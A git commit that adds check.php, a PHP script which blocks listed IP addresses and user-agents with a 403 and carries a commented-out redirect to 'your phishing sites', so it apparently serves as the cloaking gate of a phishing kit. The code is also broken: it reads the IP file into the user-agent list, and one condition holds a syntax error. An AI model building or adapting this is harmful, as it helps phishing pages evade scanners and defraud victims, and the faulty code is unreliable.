311e66217ed289dd073e30df66724d77692d0d1d
Zech Bron <39665654+ZechBron@users.noreply.github.com>
2021-10-30 19:05:00 +0700

    Create check.php

---
+++ check.php
@@ -0,0 +1,31 @@
+<?php
+/* ---[ Check if both IP Address and User-Agent is Blocked ]--- */
+if (isset($_SERVER['HTTP_CLIENT_IP'])) {
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+}
+elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+}
+elseif (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
+}
+else {
+        $ip = $_SERVER['REMOTE_ADDR'];
+}
+
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+$zCh = file_get_contents("visitors_ip.txt");
+$visitors_ip = explode("\n", $zCh);
+
+$ChB = file_get_contents("visitors_ua.txt");
+$visitors_ua = explode("\n", $zCh);
+
+if (in_array($ip, $visitors_ip) || in_array($user_agent, $visitors_ua)) {
+   header("HTTP/1.0 403 Forbidden");
+}
+elseif (!in_(array($ip, $visitors_ip) || !in_array($user_agent, $visitors_ua)) {
+   // header("Location: your phishing sites");
+}
+
+?>
